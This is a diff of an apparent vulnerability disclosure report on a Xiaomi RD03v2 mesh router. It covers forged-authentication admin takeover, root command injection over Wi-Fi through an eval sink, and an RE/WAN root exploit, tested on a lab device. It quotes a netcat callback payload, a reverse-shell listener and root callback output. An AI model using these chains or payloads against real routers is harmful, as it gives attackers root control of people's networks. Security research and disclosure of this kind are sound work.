@@ -21,7 +21,7 @@ CAP. CAP-side TLS, with **no client certificate**, succeeds: `TLSv1.2`,
 `ECDHE-RSA-AES256-GCM-SHA384`, server cert `CN=xiaoqiang` / issuer
 `CN=xiaoqiang-cn`.
 
-## V1 — admin takeover: CONFIRMED end-to-end (read-only against the target)
+## V1 — admin takeover: CONFIRMED end-to-end (no persistent configuration change)
 
 `poc/extract_admin.py --host 192.168.31.1`:
 
@@ -37,10 +37,11 @@ authenticated endpoint with it:
 
 ```
 GET …/;stok=<stok>/api/misystem/router_info
--> {"mac":"50:92:6A:70:CF:D7", … real device data … }
+-> {"mac":"<redacted device MAC>", … real device data … }
 ```
 
-The PoC never sends the `type-7` trigger, so the device is unchanged by this test.
+The PoC never sends the `type-7` trigger and does not alter persistent
+configuration. Logging in creates transient session and nonce/replay state.
 The forged-auth derivation was cross-checked against the daemon's own debug log,
 which prints the incoming peer's key (`q38d364d…`) and expected `pass`; the Python
 `base64(HMAC_SHA256("q38d364d…", id))` reproduces it exactly.
@@ -48,9 +49,9 @@ which prints the incoming peer's key (`q38d364d…`) and expected `pass`; the Py
 **V1 is reproducible on demand when the initialized CAP listener is reachable.**
 It does not depend on the CAP root sink's `NETMODE` gate.
 
-## V2 OTA — root RCE via Wi-Fi: CONFIRMED end-to-end on physical hardware
+## V1-assisted V2 OTA CAP delivery: CONFIRMED end-to-end on physical hardware
 
-The OTA combined chain (V1 → V2) was reproduced multiple times on the same physical
+The V1-assisted OTA CAP delivery was reproduced multiple times on the same physical
 RD03v2 unit. The full sequence runs purely over Wi-Fi with no WAN cable.
 
 ### Procedure
@@ -76,7 +77,8 @@ RD03v2 unit. The full sequence runs purely over Wi-Fi with no WAN cable.
 ```
 
 4. The self-repairing payload restores valid Wi-Fi encryption (`psk2`); the attacker's
-   laptop reconnects automatically. The device stays online throughout.
+   laptop reconnects after the AP briefly drops and returns with the fixed WPA2 key.
+   The router does not reboot.
 
 5. The reconnecting reverse shell connects back to the attacker's `nc -l -p 4444`:
 
@@ -124,9 +126,9 @@ tcp        0      0 :::443                  :::*                    LISTEN      
   gate-open setup state, over Wi-Fi, without admin or mesh credentials.
 - **The `eval` sink is live and reachable** through the `mgmt_2g`/`mgmt_5g` →
   `encryption` UCI path on real stock firmware.
-- **The self-repair works**: the device stays online, the attacker maintains
-  connectivity, and the reverse shell persists.
-- **The full chain is automated**: V1 admin takeover → V2 root RCE → interactive
+- **The self-repair works**: after the expected Wi-Fi interruption, the AP returns
+  with valid encryption, the attacker reconnects, and the reverse shell persists.
+- **The full delivery is automated**: V1 admin takeover → V2 root RCE → interactive
   shell, all from a single script (`poc/ota_rce.py`).
 
 This does not establish V2 reachability after ordinary Xiaomi web setup.
@@ -195,8 +197,9 @@ The final payload occupied `bh_pswd` at body offset `0x107`:
 `id|nc 192.168.77.1 80`
 ```
 
-The RE accepted type-6 (`type-7 body[0]=1`), invoked `mesh_connect.sh re_init`,
-decoded the base64-laundered field, and called back:
+The rogue CAP sent type-6; the RE processed it, returned type-7 with `body[0]=1`,
+invoked `mesh_connect.sh re_init`, decoded the base64-laundered field, and called
+back:
 
 ```
 [ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
@@ -213,7 +216,7 @@ client from the WAN MAC to the LAN MAC, and made the wired interface part of the
 new mesh configuration. The path is therefore one-shot after a successful run,
 even though `do_re_init` lacks a `NETMODE` guard and `check_re_initted` is unused.
 
-After validation, the router was factory-reset and rechecked as RD03v2 stock
+After validation, the router was factory-reset and verified as RD03v2 stock
 2.0.28 with `inited=0`. The isolated DHCP namespace and listener were removed.
 PoC: `poc/re_wan_rce.py`.
 
@@ -233,24 +236,20 @@ Instrumentation logged `NETMODE=[]` (gate open) at the guard (`do_cap_init:1043`
 the first trigger, and the on-disk config showed `NETMODE=whc_cap` afterward — i.e.
 the first `cap_init` fires the eval, then self-gates (one-shot).
 
-### Two earlier mistakes, corrected
+### CAP/LAN delivery constraints
 
-1. **The delivery bug.** An interim `rce_poc.py` placed the base64 payload in the MAC
-   header field instead of the plant, so it never landed in `do_cap_init`'s `$6`; the
-   daemon-driven flow therefore appeared "not to fire." With the payload in the plant
-   (`handshake.py --plant` / the fixed `rce_poc.py`), it fires. A contributing factor
-   in some runs was a polluted on-disk config (a prior `whc_cap` left on disk).
-2. **The `reboot` retraction still stands** — and is over-determined: `` `reboot` ``
-   (8 bytes → 12 base64 chars) does not even fit the CAP plant budget, so it was never
-   the eval. The brief blip seen for `` `reboot` ``/`` `halt` ``/`` `telnetd` `` is the
-   `cap_delete_vap` teardown that runs before the guard, not the payload.
+The base64 payload must occupy the type-4 plant at `body[0x90]`; MAC-header fields
+do not land in `do_cap_init` `$6`. After the five-word positional pad, only eight
+base64 bytes remain. For example, `` `reboot` `` needs twelve base64 bytes and
+cannot be evidence of this sink. A brief link interruption can instead come from
+`cap_delete_vap`, which runs before the shell gate.
 
-### CAP/LAN direct injection not re-confirmed on hardware
+### CAP/LAN hardware evidence boundary
 
-The direct CAP-path injection (type-4 plant) was not re-fired on the physical unit
-after the delivery fix because the tested box is `NETMODE=whc_cap`-gated. The RE/WAN
-variant is separately confirmed on factory-reset hardware above. The OTA combined
-chain remains the demonstrated route for the initialized, gate-open CAP state.
+The direct CAP/LAN payload was not executed on the physical unit while it was in
+the `NETMODE=whc_cap` state, which skips the sink. Its evidence level is therefore
+daemon-driven emulation. The separate factory RE/WAN and V1-assisted OTA CAP paths
+have the physical-hardware evidence documented above.
 
 ## V3 — root credential
 
@@ -264,7 +263,8 @@ chain remains the demonstrated route for the initialized, gate-open CAP state.
 
 ## Footprint / cleanup
 
-V1 testing changes nothing on the device (no `type-7`). The V2 OTA hardware test
+V1 testing sends no `type-7` and changes no persistent configuration; it does
+create transient login/session state. The V2 OTA hardware test
 involved multiple factory-reset + re-init cycles (all reversible; the unit is a
 disposable lab device purchased for this research). The OTA payload modifies the
 Wi-Fi `encryption` UCI keys and triggers a `cap_init` reconfiguration; the
